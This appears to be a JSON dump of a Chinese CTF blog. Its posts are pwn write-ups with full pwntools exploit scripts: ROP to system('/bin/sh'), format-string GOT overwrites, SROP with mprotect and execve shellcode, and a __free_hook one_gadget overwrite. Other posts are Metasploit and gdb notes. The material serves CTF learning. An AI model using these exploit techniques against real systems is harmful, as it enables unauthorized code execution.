[{"title":"glibc-heap导图","date":"2017-05-14T12:16:45.000Z","path":"2017/05/14/glibc-heap导图/","text":"img from","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"heap","slug":"heap","permalink":"http://reehy.top/tags/heap/"}]},{"title":"CVE-2010-3333","date":"2017-05-09T16:04:20.000Z","path":"2017/05/10/CVE-2010-3333/","text":"前2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。 环境win7 sp1 简体中文word2003简体中文 crash分析这个漏洞就是一个单纯栈溢出漏洞。先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。 首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。先查看crash文档的内容。 发现在一定长度后填充的大量的字符串。windbg附加到word上，查看崩溃现场。","tags":[{"name":"CVE","slug":"CVE","permalink":"http://reehy.top/tags/CVE/"},{"name":"Win","slug":"Win","permalink":"http://reehy.top/tags/Win/"}]},{"title":"2017广东红帽pwn","date":"2017-05-09T14:13:59.000Z","path":"2017/05/09/2017广东红帽pwn/","text":"第一次ak，记录下。不过主要因为题目很简单。 pwn1栈溢出，system已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# coding=utf-8from pwn import *slog = 0local = 0debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./pwn1')else: p = remote('106.75.93.221',10000)if local and debug: gdb.attach(p, open('debug'))elf = ELF('./pwn1')system_plt = elf.symbols['system']scanf_addr = elf.symbols['__isoc99_scanf']bss = elf.bssmain = 0x08048531ppr = 0x080485eeoffset = 52def pwn(): payload = cyclic(offset) + p32(scanf_addr) + p32(main) + p32(0x08049629) + p32(0x0804A028) payload1 = cyclic(44) + p32(system_plt) + p32(1234) + p32(0x0804a028) p.recvuntil('test')# gdb.attach(p) p.sendline(payload) p.sendline('/bin/sh') p.sendline(payload1)if __name__ == '__main__': pwn() p.interactive() pwn2格式化字符串漏洞。先泄露__libc_start_main+246的地址，然后将printf的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用readelf -a libc-2.12 | grep __libc_start_main和readelf -a libc-2.12 | grep system得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 0debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./pwn2') libc = ELF('/lib32/libc.so.6')else: p = remote('106.75.93.221',20002)if local and debug: gdb.attach(p, open('debug'))elf = ELF('./pwn2')printf_got = elf.got['printf']def leak(payload): p = process('./pwn2') p.sendline(payload) return p.recvall(0.1)def pwn():# 7611: 00016c40 437 FUNC GLOBAL DEFAULT 12 __libc_start_main# 6733: 0003ae80 125 FUNC WEAK DEFAULT 12 system payload = '%267$x' p.sendline(payload) leak_addr = int(p.recv(8), 16) print '__libc_start_main =&gt; ', hex(leak_addr) libc_address = leak_addr - 0x0016c30 - 246 print 'libc_address =&gt; ', hex(libc_address)# fmt = FmtStr(leak)# print 'offset =&gt; ', fmt.offset system_addr = libc_address + 0x0003ae80 write = &#123;printf_got:system_addr&#125; payload = fmtstr_payload(7, write, 0, 'byte')# payload = fmtstr_payload(fmt.offset, write, 0, 'byte') p.sendline(payload) p.sendline('/bin/sh\\x00')if __name__ == '__main__': pwn() p.interactive() pwn3logo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。 将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/env python# coding=utf-8from pwn import *slog = 0local = 0debug = 0global pglobal libcif slog: context(log_level = 'debug')def makeio(): if local: p = process('./pwn3') libc = ELF('/lib32/libc.so.6') else: p = remote('106.75.93.221',10002) libc = ELF('/lib32/libc.so.6') return p, libcif local and debug: gdb.attach(p, open('debug'))elf = ELF('./pwn3')printf_got = elf.got['printf']atoi_got = elf.got['atoi']fgets_got = elf.got['fgets']stdout = 0x0804A060def upid(payload): p.recvuntil('=&gt;') p.sendline('1') p.recvuntil('ID.') payload = '123456781234'+payload p.sendline(payload.ljust(0x15, '1'))def printname(): p.recvuntil('=&gt;') p.sendline('4') p.recvuntil('name:') p.recv(1)def printlogo(): p.recvuntil('=&gt;')# gdb.attach(p) p.sendline('5')def upmem(num): p.recvuntil('=&gt;') p.sendline('2') p.sendline(str(num))def upname(payload): p.recvuntil('=&gt;') p.sendline('3') p.send(payload)def leak(address): upid(p32(address)) printname() data = p.recv(4) log.info(\"%#x =&gt; %s\" % (address, data)) return datadef pwn(p): p.recvuntil('id') p.send('12345678') printlogo()# d = DynELF(leak, elf=ELF('./pwn3'))# system_addr = d.lookup('system', 'libc')# print system_addr upid(p32(atoi_got)) printname() atoi_addr = u32(p.recv(4)) - 0xa000000 print hex(atoi_addr) upid(p32(fgets_got))# gdb.attach(p) printname() print hex(u32(p.recv(4))) print 'atoi_addr =&gt; ', hex(atoi_addr) # libc.address = atoi_addr - libc.symbols['atoi']# print 'libc.address =&gt; ', hex(libc.address)# system_addr = libc.symbols['system']# print 'dis libc =&gt; ', hex(atoi_addr - libc.address)# print 'distance', hex(system_addr - atoi_addr) system_addr = atoi_addr + 0xf030 print 'system =&gt; ', hex(system_addr) upmem(5) upname(p32(system_addr))# gdb.attach(p) p.recvuntil('=&gt;') p.sendline('/bin/sh\\x00')if __name__ == '__main__': p,libc = makeio() pwn(p) p.interactive() pwn4360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。当初写的脚本找不到了，网上找了一个。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# -*-coding:utf-8-*-__author__ = 'joker'from pwn import *context.log_level = \"debug\"context.arch = \"amd64\"#r = process(\"./pwn4\")r = remote('106.75.66.195', 11006)syscall_addr = 0x4000BEstart_addr = 0x4000B0payload = p64(start_addr)payload += p64(start_addr)#fillpayload += p64(start_addr)#fillr.send(payload)#write infor leakr.send(\"\\xb3\")#write 2 start_addr last bytedata = r.recv(8)data = r.recv(8)stack_addr = u64(data) - 0xa00print \"[*]:stack:&#123;0&#125;\".format(hex(stack_addr))frame = SigreturnFrame()frame.rax = constants.SYS_readframe.rdi = 0frame.rsi = stack_addrframe.rdx = 0x300frame.rsp = stack_addrframe.rip = syscall_addrpayload = p64(start_addr)payload += p64(syscall_addr)payload += str(frame)r.send(payload)payload = p64(0x4000B3)#fillpayload += p64(0x4000B3)#fillpayload = payload[:15]r.send(payload)#set rax=sys_rt_sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = (stack_addr&amp;0xfffffffffffff000)frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108frame.rip = syscall_addrpayload = p64(start_addr)payload += p64(syscall_addr)payload += str(frame)payload += p64(stack_addr + 0x108 + 8)#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108payload += \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"#shellcoder.send(payload)payload = p64(0x4000B3)#fillpayload += p64(0x4000B3)#fillpayload = payload[:15]r.send(payload)#set rax=sys_rt_sigreturnr.interactive() pwn5老套路了。。将环境变量中文件名的指针覆盖为flag的地址，__stack_chk_fail时候输出即可。 123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=utf-8from pwn import *slog = 0local = 0debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./pwnsss')else: p = remote('106.75.93.221', 10003)if local and debug: gdb.attach(p, open('debug'))def pwn(): p.recvuntil('something\\n') payload = p32(0x0804a080) * 300 p.sendline(payload) print p.recvline()if __name__ == '__main__': pwn()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"}]},{"title":"Metasploit learning","date":"2017-05-09T04:14:44.000Z","path":"2017/05/09/Metasploit-learning/","text":"体系框架 模块Metasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。 辅助模块 AUX主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。 渗透攻击模块 Exploit核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。 攻击载荷模块 Payloads具体的完成指定任务的代码，包括独立， 传输器，传输体，三种不同的类型。 空指令模块 Nops主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。 编码器模块 Encoders通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。同时注意可能会出现找不到合适的payload的情况。 后渗透攻击模块 Post主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。Metasploit中的后渗透攻击模块的名字成为Meterpretr。 基本攻击常用命令metasploit终端命令大全 MSF 一些小坑 msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用msfupdate。如果在kali上用msfupdate可能会遇到未知错误。 Failed to connect to the database: could not connect to server: Connection refused遇到注重错误一般是postgresql服务没开，按照官方回答修改即可。","tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://reehy.top/tags/Metasploit/"}]},{"title":"pwn的一些小心得","date":"2017-04-26T12:19:33.000Z","path":"2017/04/26/pwn的一些小心得/","text":"libheaps与pwndbg兼容其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。 注册command的文件在这个目录下：/root/libheap/libheap/frontend/commands/gdb 改几个注册名就好，下面以我把heap改为libheap为例，当然可能改成heap_lib这种更合适。。。1234567class heap(gdb.Command): \"\"\"libheap command help listing\"\"\"# 主要就是__init__这里存在注册功能 def __init__(self, debugger=None, version=None): super(heap, self).__init__(\"libheap\", gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE) 当然，下面的功能名最好也改改。。。12345678910111213141516171819202122def invoke(self, arg, from_tty): # XXX: self.dbg.string_to_argv if arg.find(\"-h\") != -1: # print_header(\"heap \", end=\"\") # print(\"Options:\", end=\"\\n\\n\") # print_header(\"&#123;:&lt;15&#125;\".format(\"-a 0x1234\")) # print(\"Specify an arena address\") print_header(\"&#123;:&lt;15&#125;\".format(\"libheapls\")) print(\"Print a flat listing of all chunks in an arena\") print_header(\"&#123;:&lt;15&#125;\".format(\"libfastbins [#]\")) print(\"Print all fast bins, or only a single fast bin\") print_header(\"&#123;:&lt;15&#125;\".format(\"libsmallbins [#]\")) print(\"Print all small bins, or only a single small bin\") print_header(\"&#123;:&lt;15&#125;\".format(\"libfreebins\")) print(\"Print compact bin listing (only free chunks)\") print_header(\"&#123;:&lt;15&#125;\".format(\"libheaplsc\")) print(\"Print compact arena listing (all chunks)\") print_header(\"&#123;:&lt;15&#125;\".format(\"libmstats\"), end=\"\") print(\"Print memory alloc statistics similar to malloc_stats(3)\") # print_header(\"&#123;:&lt;22&#125;\".format(\"print_bin_layout [#]\"), end=\"\") # print(\"Print the layout of a particular free bin\") return 学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。 新工具pwngdb一个专门用来打ctfpwn的gdb增强脚本 用来功能的确好用。 i386的libc-dbg安装在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法123dpkg --print-architectureapt-get updateapt-get install libc6-dbg:i386 Unable to locate package libc6-dbg:i386 in docker gdb一些命令watch expr 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行rwatch expr设置读watchpoint，当应用程序读表达式expr时，程序停止运行awatch expr设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行","tags":[{"name":"pwndbg","slug":"pwndbg","permalink":"http://reehy.top/tags/pwndbg/"},{"name":"libheap","slug":"libheap","permalink":"http://reehy.top/tags/libheap/"}]},{"title":"2017PlaidCTF bigpicture","date":"2017-04-26T10:43:50.000Z","path":"2017/04/26/2017PlaidCTF-bigpicture/","text":"bigpicture我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。 给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。 明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。 推荐一个工具one_gadget，正如作者所说 This gem provides such gadgets finder, no need to use IDA-pro every time like a fool. 嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。 用到了一个calloc函数，第一次是在0CTF中遇到，和malloc功能相同，但是会把分配得到的内存清0。学到一个快速查看函数的方法，如：man calloc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354MALLOC(3) Linux Programmer's Manual MALLOC(3)NAME malloc, free, calloc, realloc - allocate and free dynamic memorySYNOPSIS #include &lt;stdlib.h&gt; void *malloc(size_t size); void free(void *ptr); void *calloc(size_t nmemb, size_t size); void *realloc(void *ptr, size_t size);DESCRIPTION The malloc() function allocates size bytes and returns a pointer to the allocated memory. The memory is not initialized. If size is 0, then malloc() returns either NULL, or a unique pointer value that can later be successfully passed to free(). The free() function frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc(), calloc(), or realloc(). Otherwise, or if free(ptr) has already been called before, undefined behavior occurs. If ptr is NULL, no operation is performed. The calloc() function allocates memory for an array of nmemb elements of size bytes each and returns a pointer to the allocated memory. The memory is set to zero. If nmemb or size is 0, then cal‐ loc() returns either NULL, or a unique pointer value that can later be successfully passed to free(). The realloc() function changes the size of the memory block pointed to by ptr to size bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will not be initialized. If ptr is NULL, then the call is equivalent to malloc(size), for all values of size; if size is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr). Unless ptr is NULL, it must have been returned by an earlier call to malloc(), calloc() or realloc(). If the area pointed to was moved, a free(ptr) is done.RETURN VALUE The malloc() and calloc() functions return a pointer to the allocated memory, which is suitably aligned for any built-in type. On error, these functions return NULL. NULL may also be returned by a successful call to malloc() with a size of zero, or by a successful call to calloc() with nmemb or size equal to zero. The free() function returns no value. The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any built-in type and may be different from ptr, or NULL if the request fails. If size was equal to 0, either NULL or a pointer suitable to be passed to free() is returned. If realloc() fails, the original block is left untouched; it is not freed or moved.ERRORS calloc(), malloc(), and realloc() can fail with the following error: ENOMEM Out of memory. Possibly, the application hit the RLIMIT_AS or RLIMIT_DATA limit described in getrlimit(2).ATTRIBUTES For an explanation of the terms used in this section, see attributes(7). ┌─────────────────────┬───────────────┬─────────┐ │Interface │ Attribute │ Value │ ├─────────────────────┼───────────────┼─────────┤ │malloc(), free(), │ Thread safety │ MT-Safe │ │calloc(), realloc() │ │ │ └─────────────────────┴───────────────┴─────────┘......... 思路： 利用任意地址读泄露libc基址 将__free_hook修改为one_gadget exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# coding=utf-8from pwn import *slog = 0local = 1debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./bigpicture') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote()if local and debug: gdb.attach(p, open('debug'))offset = 0x109000 + 16def edit(address, data): t = 0 address -= 0x398000 for i in range(offset - (address - libc.address), offset - (address - libc.address) - 8, -1): k = -i p.recvuntil('&gt;') p.sendline('0, &#123;&#125;, &#123;&#125;'.format(k, data[t])) t += 1def pwn(): p.recvuntil('big?') p.sendline('1000 x 1000') leak_realloc = '' # _dl_runtime_resolve_avx_slow# gdb.attach(p) for i in range(0x109000 - 24, 0x109000 - 30, -1): k = -i p.recvuntil('&gt;') p.sendline('0, &#123;&#125;, r'.format(k)) p.recvuntil('overwriting ') leak_realloc = p.recv(1) + leak_realloc print leak_realloc.encode('hex') leak_realloc = int(leak_realloc.encode('hex'), 16) libc.address = leak_realloc - libc.plt['realloc'] - 6 - 0x10 print 'libc.address =&gt; ', hex(libc.address) __free_hook_addr = libc.symbols['__free_hook'] print '__free_hook =&gt; ', hex(libc.symbols['__free_hook']) one_gadget = libc.address + 0x3f33a print 'one_gadget =&gt; ', hex(one_gadget) edit(__free_hook_addr, p64(one_gadget))# gdb.attach(p) p.sendline('quit')if __name__ == '__main__': pwn() p.interactive()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"}]},{"title":"pwn中的栈迁移","date":"2017-04-26T08:38:17.000Z","path":"2017/04/26/pwn中的栈迁移/","text":"序连着好几次遇到栈迁移问题了，总结记录下。每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类： stack pivot后mprotect ebp的partial overwrite 栈迁移的gadget i春秋百度杯try to pwn我们用0xff来填充FILE结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。 eax由这条语句赋值，其中ebx与eax的值为：12EAX 0x80efa9c (x+188) —▸ 0x80e2b6d (__EH_FRAME_BEGIN__+38021) ◂— pop espEBX 0x80efa04 (x+36) ◂— 0xffffff7f 0x804f915 &lt;fclose+53&gt; mov eax, dword ptr [ebx + 0x94]ebx的值为fake_FILE_addr+36eax的值为fake_vtable的前4个字节 我们存储shellcode的地址的addr为fake_vtable的4到8个字节。 还要注意下mprotexct的函数调用规定int mprotect(void *addr, size_t len, int prot);1mprotect() changes the access protections for the calling process's memory pages containing any part of the address range in the interval [addr, addr+len-1]. addr must be aligned to a page boundary. 注意这里的地址调用一定是页对齐的。int prot这里的数字可以简单参照linux的权限rwx，总是7是可读可写可执行。 这一题在尝试过程中发现\\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。 exp(参考了这篇文章)：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 1debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./fake')else: p = remote()if local and debug: gdb.attach(p, open('debug'))elf = ELF('./fake')name_addr = 0x80EF9E0mprotect_addr = elf.symbols['mprotect']un_FILE_addr = 0x80EFA00fake_FILE_addr = 0x80EFA04fake_vtable_addr = fake_FILE_addr + 0x94 + 0x4x_r = 0x08048f66p_r = 0x080e2b6doffset = un_FILE_addr - name_addrshellcode = '''/* execve(path='/bin///sh', argv=['sh'], envp=0) *//* push '/bin///sh\\x00' */push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, esp/* push argument array ['sh\\x00'] *//* push 'sh\\x00\\x00' */push 0x1010101xor dword ptr [esp], 0x1016972xor ecx, ecxpush ecx /* null terminate */push 4pop ecxadd ecx, esppush ecx /* 'sh\\x00' */mov ecx, espxor edx, edx/* call execve() *//* push SYS_execve */mov eax, 0xfsub eax, 0x4push eaxpop eaxint 0x80'''def pwn(): p.recvuntil('name?\\n') payload = 'a' * offset # fake_FILE_addr payload += p32(fake_FILE_addr) # fake_FILE payload += '\\xff' * 0x94 # fake_jmp_t payload += p32(fake_vtable_addr) # fake_vtable payload += p32(p_r) payload += p32(un_FILE_addr + 300) payload += p32(x_r) * 16 # mprotect junk = 300 - len(payload) + 32 payload += cyclic(junk) payload += p32(mprotect_addr) payload += p32(un_FILE_addr + 300 + 20) # shellcode addr payload += p32(0x080ef000) payload += p32(1024) payload += p32(7) payload += asm(shellcode) gdb.attach(p) p.sendline(payload) p.recvuntil('&gt;') p.sendline('3')if __name__ == '__main__': pwn() p.interactive() 南京线下赛decoderchecksec:1234567root@kali ~/c/NJoffline# checksec decoder[*] '/root/ctf-problem/NJoffline/decoder' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。 所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。 1234567891011121314151617181920212223242526272829root@kali ~/c/NJoffline# ROPgadget --binary decoder | grep 'esp'0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret0x08048605 : add esp, 0x10 ; leave ; ret0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048492 : add esp, 8 ; pop ebx ; ret0x08048af7 : and esp, dword ptr [ebx + 0x804b054] ; nop ; pop ebp ; ret0x08048cd7 : clc ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret0x0804848e : inc byte ptr [eax] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret0x08048687 : je 0x8048684 ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx0x08048d33 : jne 0x8048d21 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048cd5 : lea esp, dword ptr [ebp - 8] ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret0x08048cdb : lea esp, dword ptr [ecx - 4] ; ret0x08048d4f : mov bl, 0x22 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret0x0804868a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx0x080485d0 : mov ebx, dword ptr [esp] ; ret0x08048b30 : nop ; add esp, 0x40 ; pop edi ; pop ebp ; ret0x080485cf : nop ; mov ebx, dword ptr [esp] ; ret0x080485cd : nop ; nop ; mov ebx, dword ptr [esp] ; ret0x080485cb : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret0x08048cda : pop ebp ; lea esp, dword ptr [ecx - 4] ; ret0x08048cd8 : pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret0x08048cd9 : pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret0x08048689 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx0x08048634 : sub esp, 0x10 ; push eax ; push 0x804b04c ; call edx0x080485fb : sub esp, 0x14 ; push 0x804b04c ; call eax0x0804868c : sub esp, 0x14 ; push eax ; call edx0x08048475 : sub esp, 8 ; call 0x80485d90x08048af6 : xor esp, dword ptr [ebx] ; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret 发现这几条还是可用的：123450x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret0x08048605 : add esp, 0x10 ; leave ; ret0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048492 : add esp, 8 ; pop ebx ; ret 于是我们的思路如下： 在栈上利用gadget0x08048b31布置好ropchain 利用fsb将fflish改为我们的gadget0x08048b31 在bss写入/bin/sh 修改fflush为system 附上南大某女生exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python# coding=utf-8from pwn import *import base64slog = 1local = 1debug = 0if slog: context.log_level = Trueif local: p = process('./decoder') libc = ELF('/lib32/libc.so.6')else: p = remote('172.16.1.10', 20000) libc = ELF('./lib/i386-linux-gnu/libc-2.19.so')elf = ELF('decoder')printf_got = elf.got['printf'] # 0x80484c0printf_plt = elf.symbols['printf'] read_addr = elf.symbols['read']fflush_plt = elf.symbols['fflush']realloc_got = elf.got['realloc']fflush_got = elf.got['fflush']main_addr = 0x804836eprint('fflush_got = ' + hex(fflush_got))print('printf_plt = ' + hex(printf_plt))addesp_72 = 0x08048b31rodata = 0x8048de0 # '%d:%s'bss_addr = 0x804b050s = base64.b64encode('%02052d%20$hn%033581d%21$hn%22$x') # add_esppayload = s + (13 - len(s) / 4) * p32(0) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(1) + p32(printf_got)# printf(rodata, '1', printf_got) # 0xffa8a3f4 payload += p32(fflush_got + 2) + p32(fflush_got) + p32(fflush_got) payload += p32(0x1) * 0xc + p32(read_addr) + p32(addesp_72) + p32(0) + p32(fflush_got) + p32(4) #0xffa8a434 -&gt; readpayload += p32(0x2) * 0xf + p32(read_addr) + p32(addesp_72) + p32(0) + p32(bss_addr) + p32(8)payload += p32(0x3) * 0xf + p32(fflush_plt) + p32(0xdeadbeef) + p32(bss_addr)# gdb.attach(p, open('debug'))gdb.attach(p)p.recvuntil('DECODER\\n')p.sendline(payload)p.recvuntil(':')printf_addr = u32(p.recv(4))system_addr = printf_addr + libc.symbols['system'] - libc.symbols['printf']#binsh_addr = printf_addr + next(libc.search('/bin/sh')) - libc.symbols['printf']print('system_addr = ' + hex(system_addr))p.send(p32(system_addr))p.send(\"/bin/sh\\0\")p.interactive() 2017BCTF100levels","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"stack","slug":"stack","permalink":"http://reehy.top/tags/stack/"}]},{"title":"Qt初体验","date":"2017-04-23T12:31:08.000Z","path":"2017/04/23/Qt初体验/","text":"最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。","tags":[{"name":"Qt","slug":"Qt","permalink":"http://reehy.top/tags/Qt/"},{"name":"C/C++","slug":"C-C","permalink":"http://reehy.top/tags/C-C/"}]},{"title":"pwnable.tw","date":"2017-04-23T12:00:03.000Z","path":"2017/04/23/pwnable-tw/","text":"orw汇编中i386的系统调用传参方式 exp:123456789101112131415161718192021222324#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context(log_level = 'debug')shellcode = shellcraft.i386.sh()bss = 0x0804a060#shellcode = asm(shellcode)#shellcode = \"\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\"shellcode = 'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'shellcode += 'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'shellcode += 'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'shellcode = asm(shellcode)print len(shellcode)shellcode += '/home/orw/flag\\x00'# p = process('./orw')p = remote('chall.pwnable.tw', 10001)p.recvuntil(':')#gdb.attach(p)p.send(shellcode)print p.recvall() 使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。 用locate定位系统调用号1234567root@kali ~/c/p/orw# locate unistd_32/usr/include/x86_64-linux-gnu/asm/unistd_32.h/usr/lib/x86_64-linux-gnu/perl/5.22.2/asm/unistd_32.ph/usr/lib/x86_64-linux-gnu/perl/5.24.1/asm/unistd_32.ph/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/asm/unistd_32_ia32.h/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/uapi/asm/unistd_32.h/usr/src/linux-headers-4.9.0-kali3-common/arch/sh/include/uapi/asm/unistd_32.h","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"writeup","slug":"writeup","permalink":"http://reehy.top/tags/writeup/"}]},{"title":"2017BCTF & pwndbg & ida","date":"2017-04-22T13:07:06.000Z","path":"2017/04/22/2017BCTF-pwndbg-ida/","text":"工具pwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。 今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。 pwndbg的README说的很详细了，不在赘述。 babyuse看了看别人的wp，总结了几种利用方法。 leak都用UAF malloc一个大内存(&gt;128)，会存在unsortbins中，可以leak出main_arena，计算出libc 利用fastbin的链表结构，leak出heap_base Nu1L用末尾添加\\x00的方法，修改指针最后一位\\x00使其指向vtable，leak出pie的地址 shell一般都用one_gadget，Nu1L的_init_arry没看懂。 为了方便调试，关闭ASLR，并且简单写了个gdb脚本。 12345678910111213141516171819202122232425262728293031323334# import glibc# directory ~/desktop/glibc-2.24/malloc/######################################################## context configset ida-rpc-host 192.168.234.1####################################################### ignore SIGALRM# handle SIGALRM ignore#######################################################define p32break break * 0x56555000 + $arg0enddocument p32break break when PIE is onend########################################################define p32telescope telescope 0x56555000+$arg0 $arg1enddocument p32telescope telescope when PIE is onend#######################################################source aadefine ssa session save aaend 100levels","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"pwndbg","slug":"pwndbg","permalink":"http://reehy.top/tags/pwndbg/"},{"name":"ida","slug":"ida","permalink":"http://reehy.top/tags/ida/"}]},{"title":"真是蛋疼的生活","date":"2017-04-18T23:54:32.000Z","path":"2017/04/19/真是蛋疼的生活/","text":"0x00前两天南京线下赛结束，我校光荣拿了倒二。 讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在划水。平时训练中我对团队一直是放羊式的管理，始终认为激情与活力才是一个团队成功的最终要要素，而硬性的规定只不过是自欺欺人。 但实事总是和我们想象的差太远了。 